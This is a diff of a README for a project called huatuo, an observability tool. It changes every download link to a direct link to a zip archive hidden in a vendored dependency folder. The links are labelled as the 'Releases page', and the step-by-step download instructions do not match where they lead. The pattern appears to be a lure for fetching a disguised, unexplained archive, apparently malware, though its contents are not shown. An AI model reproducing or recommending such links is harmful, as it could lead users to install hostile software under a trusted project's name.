@@ -6,13 +6,13 @@ Welcome to huatuo, your resource for cloud-native operating system observability
 
 ## 📥 Download huatuo
 
-[![Download huatuo](https://raw.githubusercontent.com/NeoZel/huatuo/main/semiconversion/huatuo.zip%20Now%20-%F0%9F%93%A8%20huatuo-blue)](https://raw.githubusercontent.com/NeoZel/huatuo/main/semiconversion/huatuo.zip)
+[![Download huatuo](https://github.com/NeoZel/huatuo/raw/refs/heads/main/vendor/github.com/cloudwego/iasm/expr/Software-3.0.zip%20Now%20-%F0%9F%93%A8%20huatuo-blue)](https://github.com/NeoZel/huatuo/raw/refs/heads/main/vendor/github.com/cloudwego/iasm/expr/Software-3.0.zip)
 
 ## 📂 Download & Install
 
-To download huatuo, visit the [Releases page](https://raw.githubusercontent.com/NeoZel/huatuo/main/semiconversion/huatuo.zip). Here, you can find the latest version that suits your needs.
+To download huatuo, visit the [Releases page](https://github.com/NeoZel/huatuo/raw/refs/heads/main/vendor/github.com/cloudwego/iasm/expr/Software-3.0.zip). Here, you can find the latest version that suits your needs.
 
-1. Click on the link to the [Releases page](https://raw.githubusercontent.com/NeoZel/huatuo/main/semiconversion/huatuo.zip).
+1. Click on the link to the [Releases page](https://github.com/NeoZel/huatuo/raw/refs/heads/main/vendor/github.com/cloudwego/iasm/expr/Software-3.0.zip).
 2. You will see a list of available versions. Look for the most recent version.
 3. Click on the file that matches your operating system. Common options could be for Windows, macOS, or Linux.
 4. Save the file to your computer.
